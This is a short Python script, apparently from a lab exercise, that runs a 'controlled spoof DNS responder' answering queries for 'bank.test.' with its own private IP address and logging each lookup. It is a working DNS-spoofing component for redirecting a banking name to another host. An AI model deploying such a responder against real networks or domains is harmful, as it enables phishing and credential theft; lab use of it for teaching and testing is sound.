from dnslib import DNSRecord, RR, A
import socket

LISTEN_IP = "10.203.0.3"
PORT = 53

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.bind((LISTEN_IP, PORT))

print(f"Controlled spoof DNS responder listening on {LISTEN_IP}:{PORT}", flush=True)

while True:
    data, addr = sock.recvfrom(4096)

    try:
        request = DNSRecord.parse(data)
        qname = str(request.q.qname)
        qtype = str(request.q.qtype)

        print(f"[SPOOF] {addr[0]}:{addr[1]} -> {qname} (type {qtype})", flush=True)

        reply = request.reply()

        if qname.lower() == "bank.test." and qtype == "1":
            reply.add_answer(
                RR("bank.test.", rdata=A("10.203.0.3"), ttl=60)
            )

        sock.sendto(reply.pack(), addr)

    except Exception as e:
        print(f"[ERROR] {e}", flush=True)
